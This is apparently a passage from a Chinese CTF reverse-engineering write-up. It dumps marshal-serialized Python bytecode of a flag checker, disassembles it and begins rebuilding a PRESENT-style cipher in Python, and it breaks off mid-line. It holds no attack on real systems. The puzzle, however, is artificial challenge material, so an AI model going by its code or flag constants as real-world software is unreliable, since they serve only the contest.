\x00\x00\x00g\x00|\x00]\x18&#125;\x01t\x00\x88\x00|\x01\x19\x00\x83\x01d\x00|\x01\x14\x00&gt;\x00\x91\x02q\x04S\x00)\x01\xe9\x08\x00\x00\x00)\x01\xda\x03ord)\x02\xda\x02.0\xda\x01c\xa9\x01\xda\x01i\xa9\x00\xda\x00\xda\n&lt;listcomp&gt;\x03\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00z!string2number.&lt;locals&gt;.&lt;listcomp&gt;r\x00\x00\x00\x00)\x02\xda\x03sum\xda\x05ranger\x04\x00\x00\x00r\x06\x00\x00\x00r\x04\x00\x00\x00r\x07\x00\x00\x00\xda\rstring2number\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x0b\x00\x00\x00s\x01\x05\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00st\x00\x00\x00g\x00&#125;\x02t\x00d\x01|\x01d\x01\x17\x00d\x01\x83\x03D\x00]Z&#125;\x03|\x02\xa0\x01|\x00d\x02?\x00\xa1\x01\x01\x00|\x00d\x03@\x00d\x04&gt;\x00|\x00d\x05?\x00\x17\x00&#125;\x00t\x02|\x00d\x06?\x00\x19\x00d\x06&gt;\x00|\x00d\x07d\x06\x13\x00d\x01\x18\x00@\x00\x17\x00&#125;\x00|\x00|\x03d\x08&gt;\x00|\x00d\x05?\x00A\x00N\x00&#125;\x00q\x14|\x02S\x00)\tN\xe9\x01\x00\x00\x00\xe9\x10\x00\x00\x00i\xff\xff\x07\x00\xe9=\x00\x00\x00\xe9\x13\x00\x00\x00\xe9L\x00\x00\x00\xe9\x02\x00\x00\x00\xe9\x0f\x00\x00\x00)\x03\xda\x05range\xda\x06appendZ\x04Sbox)\x04\xda\x03key\xda\x06roundsZ\troundkeys\xda\x01i\xa9\x00r\x0c\x00\x00\x00\xda\x00\xda\x13generateRoundkeys80\x02\x00\x00\x00s\x0e\x00\x00\x00\x00\x01\x04\x01\x14\x01\x0e\x01\x14\x01 \x01\x16\x01r\x0e\x00\x00\x00sF\x03\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01N)\x05r\x0e\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x0c\x00\x00\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\t\n\x01N)\x05r\x0b\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x06\x00\x00\x00r\x06\x00\x00\x00r\x06\x00\x00\x00r\x07\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\x05r\t\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x07\x00\x00\x00r\x07\x00\x00\x00r\x07\x00\x00\x00r\x08\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01&#x27;</span></span><br><span class="line">code[<span class="number">4</span>] = <span class="string">b&#x27;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00s\x1a\x00\x00\x00t\x00\x87\x00f\x01d\x01d\x02\x84\x08t\x01d\x03\x83\x01D\x00\x83\x01\x83\x01S\x00)\x04Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00s \x00\x00\x00g\x00|\x00]\x18&#125;\x01t\x00\x88\x00|\x01\x19\x00\x83\x01d\x00|\x01\x14\x00&gt;\x00\x91\x02q\x04S\x00)\x01\xe9\x08\x00\x00\x00)\x01\xda\x03ord)\x02\xda\x02.0\xda\x01c\xa9\x01\xda\x01i\xa9\x00\xda\x00\xda\n&lt;listcomp&gt;\x03\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00z!string2number.&lt;locals&gt;.&lt;listcomp&gt;r\x00\x00\x00\x00)\x02\xda\x03sum\xda\x05ranger\x04\x00\x00\x00r\x06\x00\x00\x00r\x04\x00\x00\x00r\x07\x00\x00\x00\xda\rstring2number\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x0b\x00\x00\x00s\x01\x05\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00st\x00\x00\x00g\x00&#125;\x02t\x00d\x01|\x01d\x01\x17\x00d\x01\x83\x03D\x00]Z&#125;\x03|\x02\xa0\x01|\x00d\x02?\x00\xa1\x01\x01\x00|\x00d\x03@\x00d\x04&gt;\x00|\x00d\x05?\x00\x17\x00&#125;\x00t\x02|\x00d\x06?\x00\x19\x00d\x06&gt;\x00|\x00d\x07d\x06\x13\x00d\x01\x18\x00@\x00\x17\x00&#125;\x00|\x00|\x03d\x08&gt;\x00|\x00d\x05?\x00A\x00N\x00&#125;\x00q\x14|\x02S\x00)\tN\xe9\x01\x00\x00\x00\xe9\x10\x00\x00\x00i\xff\xff\x07\x00\xe9=\x00\x00\x00\xe9\x13\x00\x00\x00\xe9L\x00\x00\x00\xe9\x02\x00\x00\x00\xe9\x0f\x00\x00\x00)\x03\xda\x05range\xda\x06appendZ\x04Sbox)\x04\xda\x03key\xda\x06roundsZ\troundkeys\xda\x01i\xa9\x00r\x0c\x00\x00\x00\xda\x00\xda\x13generateRoundkeys80\x02\x00\x00\x00s\x0e\x00\x00\x00\x00\x01\x04\x01\x14\x01\x0e\x01\x14\x01 \x01\x16\x01r\x0e\x00\x00\x00sF\x03\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01N)\x05r\x0e\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x0c\x00\x00\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\t\n\x01N)\x05r\x0b\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x06\x00\x00\x00r\x06\x00\x00\x00r\x06\x00\x00\x00r\x07\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01&#x27;</span></span><br><span class="line">code[<span class="number">5</span>] = <span class="string">b&#x27;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00st\x00\x00\x00g\x00&#125;\x02t\x00d\x01|\x01d\x01\x17\x00d\x01\x83\x03D\x00]Z&#125;\x03|\x02\xa0\x01|\x00d\x02?\x00\xa1\x01\x01\x00|\x00d\x03@\x00d\x04&gt;\x00|\x00d\x05?\x00\x17\x00&#125;\x00t\x02|\x00d\x06?\x00\x19\x00d\x06&gt;\x00|\x00d\x07d\x06\x13\x00d\x01\x18\x00@\x00\x17\x00&#125;\x00|\x00|\x03d\x08&gt;\x00|\x00d\x05?\x00A\x00N\x00&#125;\x00q\x14|\x02S\x00)\tN\xe9\x01\x00\x00\x00\xe9\x10\x00\x00\x00i\xff\xff\x07\x00\xe9=\x00\x00\x00\xe9\x13\x00\x00\x00\xe9L\x00\x00\x00\xe9\x02\x00\x00\x00\xe9\x0f\x00\x00\x00)\x03\xda\x05range\xda\x06appendZ\x04Sbox)\x04\xda\x03key\xda\x06roundsZ\troundkeys\xda\x01i\xa9\x00r\x0c\x00\x00\x00\xda\x00\xda\x13generateRoundkeys80\x02\x00\x00\x00s\x0e\x00\x00\x00\x00\x01\x04\x01\x14\x01\x0e\x01\x14\x01 \x01\x16\x01r\x0e\x00\x00\x00sF\x03\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01N)\x05r\x0e\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x0c\x00\x00\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\t\n\x01&#x27;</span></span><br><span class="line">code[<span class="number">6</span>] = <span class="string">b&#x27;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ser-code: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="number">7</span> - i))</span><br><span class="line">    l = marshal.loads(code[i])</span><br><span class="line">    dis.dis(l)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;============================================================================&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>还原流程：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Sbox = [<span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">Sbox_inv = [Sbox.index(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line">PBox = [</span><br><span class="line">    <span class="number">0</span>, <span class="number">16</span>, <span class="number">32</span>, <span class="number">48</span>, <span class="number">1</span>, <span class="number">17</span>, <span class="number">33</span>, <span class="number">49</span>, <span class="number">2</span>, <span class="number">18</span>, <span class="number">34</span>, <span class="number">50</span>, <span class="number">3</span>, <span class="number">19</span>, <span class="number">35</span>, <span class="number">51</span>,</span><br><span class="line">    <span class="number">4</span>, <span class="number">20</span>, <span class="number">36</span>, <span class="number">52</span>, <span class="number">5</span>, <span class="number">21</span>, <span class="number">37</span>, <span class="number">53</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">38</span>, <span class="number">54</span>, <span class="number">7</span>, <span class="number">23</span>, <span class="number">39</span>, <span class="number">55</span>,</span><br><span class="line">    <span class="number">8</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">56</span>, <span class="number">9</span>, <span class="number">25</span>, <span class="number">41</span>, <span class="number">57</span>, <span class="number">10</span>, <span class="number">26</span>, <span class="number">42</span>, <span class="number">58</span>, <span class="number">11</span>, <span class="number">27</span>, <span class="number">43</span>, <span class="number">59</span>,</span><br><span class="line">    <span class="number">12</span>, <span class="number">28</span>, <span class="number">44</span>, <span class="number">60</span>, <span class="number">13</span>, <span class="number">29</span>, <span class="number">45</span>, <span class="number">61</span>, <span class="number">14</span>, <span class="number">30</span>, <span class="number">46</span>, <span class="number">62</span>, <span class="number">15</span>, <span class="number">31</span>, <span class="number">47</span>, <span class="number">63</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">PBox_inv = [PBox.index(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addRoundKey</span>(<span class="params">state, roundkey</span>):</span><br><span class="line">    <span class="keyword">return</span> state ^ roundkey</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sBoxLayer</span>(<span class="params">state</span>):</span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        output += Sbox[(state &gt;&gt; (i * <span class="number">4</span>)) &amp; <span class="number">15</span>] &lt;&lt; (i * <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pLayer</span>(<span class="params">state</span>):</span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        output += ((state &gt;&gt; i) &amp; <span class="number">1</span>) &lt;&lt; PBox[i]</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">string2number</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>([(<span class="built_in">ord</span>(i[c]) &lt;&lt; (<span class="number">8</span> * c)) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generateRoundkeys80</span>(<span class="params">key, rounds</span>):</span><br><span class="line">    roundkeys = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, rounds + <span class="number">1</span>):</span><br><span class="line">        roundkeys.append(key &gt;&gt; <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">        key = ((key &amp; <span class="number">524287</span>) &lt;&lt; <span class="number">61</span>) + (key &gt;&gt; <span class="number">19</span>)</span><br><span class="line"></span><br><span class="line">        key = (Sbox[key &gt;&gt; <span class="number">76</span>] &lt;&lt; <span class="number">76</span>) + (key &amp; ((<span class="number">2</span> ** <span class="number">76</span>) - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">        key ^= (i &lt;&lt; <span class="number">15</span>) ^ (key &gt;&gt; <span class="number">19</span>)</span><br><span class="line">    <span class="keyword">return</span> roundkeys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">blocks</span>):</span><br><span class="line">    rounds = <span class="number">32</span></span><br><span class="line">    roundkeys = generateRoundkeys80(<span class="number">85354531916197809168417</span>, rounds)</span><br><span class="line">    out = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> blocks:</span><br><span class="line">        state = string2number(block)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds - <span class="number">1</span>):</span><br><span class="line">            state = addRoundKey(state, roundkeys[i])</span><br><span class="line">            state = sBoxLayer(state)</span><br><span class="line">            state = pLayer(state)</span><br><span class="line"></span><br><span class="line">        cipher = addRoundKey(state, roundkeys[-<span class="number">1</span>])</span><br><span class="line">        out.append(cipher)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inp = <span class="built_in">input</span>(<span class="string">&#x27;pls input ur flag:&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(inp) != <span 